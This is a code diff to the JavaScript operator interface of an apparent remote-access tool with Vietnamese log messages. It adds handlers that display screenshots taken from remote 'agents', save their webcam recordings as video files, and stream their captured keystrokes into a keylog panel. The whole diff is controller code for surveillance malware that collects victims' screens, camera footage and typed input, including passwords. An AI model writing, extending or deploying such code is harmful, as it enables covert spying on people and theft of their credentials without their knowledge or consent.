@@ -22,6 +22,7 @@ const gateway = new Gateway({
         appState.isConnected = true;
         gateway.refreshAgents();
     },
+
     onDisconnected: () => {
         console.warn("[System] Disconnected from Gateway.");
         appState.isConnected = false;
@@ -40,32 +41,35 @@ const gateway = new Gateway({
         }
         ui.updateAgentList(agentList);
     },
-    onMessage: (msg) => {
-        if (msg.type === CONFIG.CMD.AUTH || msg.type === CONFIG.CMD.GET_AGENTS) return;
 
-        const from = msg.from || 'SERVER';
-        console.group(`Received [${msg.type}] from ${from}`);
-        console.log("Data:", msg.data);
-        console.groupEnd();
+    onScreenshot: (base64Data, agentId) => {
+        console.log(`Hiển thị ảnh từ ${agentId}`);
+        const modal = document.getElementById('image-modal');
+        const img = document.getElementById('modal-img');
+        
+        img.src = "data:image/jpeg;base64," + base64Data;
+        modal.classList.remove('hidden');
+    },
 
-        switch (msg.type) {
-            case CONFIG.CMD.CAM_RECORD:
-                if (msg.data.status === 'ok') {
-                    console.log(`[Camera] Video received (${msg.data.data.length} bytes)`);
-                }
-                break;
-            case CONFIG.CMD.SCREENSHOT:
-                if (msg.data.status === 'ok') {
-                    console.log(`[Screenshot] Image received`);
-                    const img = new Image();
-                    img.src = "data:image/jpeg;base64," + msg.data.data;
-                    const w = window.open("");
-                    w.document.write(img.outerHTML);
-                }
-                break;
-            default:
-                break;
+    onCamera: (videoData, agentId) => {
+        console.log(`Nhận video từ ${agentId}, lưu file...`);
+        const link = document.createElement('a');
+        link.href = "data:video/mp4;base64," + videoData;
+        link.download = `cam_${agentId}_${Date.now()}.mp4`;
+        link.click();
+    },
+
+    onKeylog: (keyData, agentId) => {
+        const keylogPanel = document.getElementById('keylog-panel');
+        if (keylogPanel) {
+            keylogPanel.value += keyData;
+            keylogPanel.scrollTop = keylogPanel.scrollHeight;
         }
+        console.log(`[Keylog ${agentId}]: ${keyData}`);
+    },
+
+    onMessage: (msg) => {
+        console.log("System Msg: ", msg);
     },
     onError: (err) => {
         console.error("[Main] Error:", err);
